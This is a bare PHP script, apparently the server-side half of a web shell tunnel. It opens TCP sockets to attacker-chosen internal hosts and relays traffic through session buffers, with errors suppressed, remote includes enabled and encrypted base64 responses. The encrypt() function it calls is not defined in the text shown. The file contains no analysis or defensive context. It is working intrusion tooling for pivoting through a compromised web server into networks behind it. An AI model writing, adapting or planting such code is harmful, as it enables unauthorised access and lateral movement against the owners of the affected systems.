<?
@error_reporting(0);

function main($action, $targetIP = "", $targetPort = "", $socketHash = "", $extraData = "MTIz")
{
    ini_set("allow_url_fopen", true);
    ini_set("allow_url_include", true);
    if (function_exists('dl')) {
        dl("php_sockets.dll");
    }
    if (!function_exists('apache_request_headers')) {
        function apache_request_headers()
        {
            $arh = array();
            $rx_http = '/\AHTTP_/';

            foreach ($_SERVER as $key => $val) {
                if (preg_match($rx_http, $key)) {
                    $arh_key = preg_replace($rx_http, '', $key);
                    $rx_matches = array();
                    $rx_matches = explode('_', $arh_key);
                    if (count($rx_matches) > 0 and strlen($arh_key) > 2) {
                        foreach ($rx_matches as $ak_key => $ak_val) {
                            $rx_matches[$ak_key] = ucfirst($ak_val);
                        }
                        $arh_key = implode('-', $rx_matches);
                    }
                    $arh[$arh_key] = $val;
                }
            }
            return ($arh);
        }
    }

    set_time_limit(0);
    $headers = apache_request_headers();
    $result = array();
    switch ($action) {
        case "create": {
                $sockObj = getSocket($targetIP, $targetPort);
                $sock = $sockObj["s"];
                $s_type = $sockObj["s_type"];
                if ($s_type == 'error') {
                    echo "\x37\x21\x49\x36Failed connecting to target" . $sock;
                    return;
                }



                $socketRead = "socket_read";
                $socketWrite = "socket_write";
                $socketClose = "socket_close";
                $socketSelect = "socket_select";
                if ($s_type == 'stream') {
                    $socketRead = "fread";
                    $socketWrite = "fwrite";
                    $socketClose = "fclose";
                    $socketSelect = "stream_select";
                }
                if ($s_type == 'stream') {
                    stream_set_blocking($sock, false);
                } else {
                    socket_set_nonblock($sock);
                }
                @session_start();
                $_SESSION["run" . "_" . $socketHash] = true;
                $_SESSION["writebuf" . "_" . $socketHash] = "";
                $_SESSION["readbuf" . "_" . $socketHash] = "";

                ob_end_clean();
                header("Connection: close");
                ignore_user_abort();
                ob_start();
                $size = ob_get_length();
                header("Content-Length: $size");
                ob_end_flush();
                flush();
                session_write_close();
                //fastcgi_finish_request();

                while ($_SESSION["run" . "_" . $socketHash]) {
                    $readBuff = "";
                    @session_start();
                    $writeBuff = $_SESSION["writebuf" . "_" . $socketHash];
                    $_SESSION["writebuf" . "_" . $socketHash] = "";
                    session_write_close();
                    if ($writeBuff != "") {
                        $i = $socketWrite($sock, $writeBuff, strlen($writeBuff));
                        if ($i === false) {
                            @session_start();
                            $_SESSION["run" . "_" . $socketHash] = false;
                            session_write_close();
                            //echo "\x37\x21\x49\x36Failed writing socket";
                        }
                    }
                    while ($o = $socketRead($sock, 512)) {
                        if ($o === false) {
                            @session_start();
                            $_SESSION["run" . "_" . $socketHash] = false;
                            session_write_close();
                            //echo "\x37\x21\x49\x36Failed reading from socket";
                        }
                        $readBuff .= $o;
                    }
                    if ($readBuff != "") {
                        @session_start();
                        $_SESSION["readbuf" . "_" . $socketHash] .= $readBuff;
                        session_write_close();
                    }
                    #sleep(0.2);
                }
                $socketClose($sock);
            }
            break;
        case "close": {
                @session_start();
                $_SESSION["run" . "_" . $socketHash] = false;
                session_write_close();
                $result["msg"] = base64_encode("ok");
                $result["status"] = base64_encode("success");
                echo encrypt(json_encode($result));
            }
            break;
        case "read": {
                @session_start();
                $readBuffer = $_SESSION["readbuf" . "_" . $socketHash];
                $_SESSION["readbuf" . "_" . $socketHash] = "";
                $running = $_SESSION["run" . "_" . $socketHash];
                session_write_close();
                if ($running) {
                    header("Connection: Keep-Alive");
                    $result["msg"] = base64_encode(base64_encode($readBuffer));
                    $result["status"] = base64_encode("success");
                    echo encrypt(json_encode($result));
                    return;
                } else {
                    $result["msg"] = base64_encode("error");
                    $result["status"] = base64_encode("fail");
                    echo encrypt(json_encode($result));
                    return;
                }
            }
            break;
        case "write": {
                @session_start();
                $running = $_SESSION["run" . "_" . $socketHash];
                session_write_close();
                if (!$running) {
                    $result["msg"] = base64_encode("error");
                    $result["status"] = base64_encode("fail");
                    echo encrypt(json_encode($result));
                    return;
                }
                header('Content-Type: application/octet-stream');
                $rawPostData = base64_decode($extraData);
                if ($rawPostData) {
                    @session_start();
                    $_SESSION["writebuf" . "_" . $socketHash] .= $rawPostData;
                    session_write_close();
                    header("Connection: Keep-Alive");
                    $result["msg"] = base64_encode("ok");
                    $result["status"] = base64_encode("success");
                    echo encrypt(json_encode($result));
                    return;
                } else {
                    $result["msg"] = base64_encode("POST request read filed");
                    $result["status"] = base64_encode("fail");
                    echo encrypt(json_encode($result));
                    return;
                }
                break;
            }
        case "clear": {
                @session_start();
                foreach ($_SESSION as $key => $val) {
                    if (strpos($key, "run_") >= 0) {
                        $_SESSION[$key] = false;
                    }
                    if (strpos($key, "writebuf_") >= 0 || strpos($key, "readbuf_") >= 0) {
                        unset($_SESSION[$key]);
                    }
                }
                $result["msg"] = base64_encode("ok");
                $result["status"] = base64_encode("success");
                echo encrypt(json_encode($result));
                break;
            }
    }
}
function getSocket($ip, $port)
{
    $resultObj = array();
    if (($f = 'stream_socket_client') && is_callable($f)) {
        $s = $f("tcp://{$ip}:{$port}");
        $s_type = 'stream';
    }
    if (!$s && ($f = 'fsockopen') && is_callable($f)) {
        $s = $f($ip, $port);
        $s_type = 'stream';
    }
    if (!$s && ($f = 'socket_create') && is_callable($f)) {
        $s = $f(AF_INET, SOCK_STREAM, SOL_TCP);
        $res = @socket_connect($s, $ip, $port);
        if (!$res) {
            die();
        }
        $s_type = 'socket';
    }
    if (!$s_type) {
        $s_type = "error";
        $s = 'no socket funcs';
    }
    if (!$s) {
        $s_type = "error";
        $s = 'no socket';
    }
    $resultObj["s"] = $s;
    $resultObj["s_type"] = $s_type;
    return $resultObj;
}
